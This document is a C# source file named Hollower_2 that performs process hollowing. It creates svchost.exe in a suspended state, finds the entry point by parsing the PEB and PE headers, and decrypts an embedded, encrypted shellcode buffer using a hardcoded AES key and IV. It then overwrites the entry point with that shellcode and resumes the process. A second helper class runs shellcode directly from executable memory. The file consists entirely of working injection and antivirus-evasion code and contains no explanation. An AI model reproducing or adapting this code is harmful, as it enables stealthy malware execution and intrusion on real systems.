using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Claims;
using System.Threading;

namespace Hollower_2 
{ 
    struct STARTUPINFO
{
    public Int32 cb;
    public IntPtr lpReserved;
    public IntPtr lpDesktop;
    public IntPtr lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize; 
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[StructLayout(LayoutKind.Sequential)]
 struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
[StructLayout(LayoutKind.Sequential)]
 struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}


class AESInject
{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Inject(byte[] shellcode)
    {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public static byte[] AESDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            return aesAlg.CreateDecryptor().TransformFinalBlock(cipherText, 0, cipherText.Length);
        }
    }
}
    class Program
    {
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

    uint tmp = 0;
    IntPtr hProcess = pi.hProcess;
    ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
    IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
    byte[] addrBuf = new byte[IntPtr.Size];
    IntPtr nRead = IntPtr.Zero;
    ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
    IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
    byte[] data = new byte[0x200];
    ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
    uint opthdr = e_lfanew_offset + 0x28;
    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

    byte[] buf = new byte[704] {0xf7,0x28,0x1d,0xa2,0x6e,0x2b,
0x27,0x5c,0x3c,0x39,0xcf,0x1f,0xf6,0x9b,0xa5,0xa4,0x38,0xf4,
...
0xad,0x5e};
            
byte[] key = Convert.FromBase64String("ZGVhZGJlZWZkZWFkYmVlZmRlYWRiZWVmZGVhZGJlZWY=");// --encrypt aes256 --encrypt-key deadbeefdeadbeefdeadbeefdeadbeef
        byte[] iv = Convert.FromBase64String("ZGVhZGJlZWZkZWFkYmVlZg=="); // --encrypt-iv deadbeefdeadbeef
        byte[] decryptedShellcode = AESInject.AESDecrypt(buf, key, iv);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedShellcode, decryptedShellcode.Length, out nRead);
    ResumeThread(pi.hThread);
}
}
}     
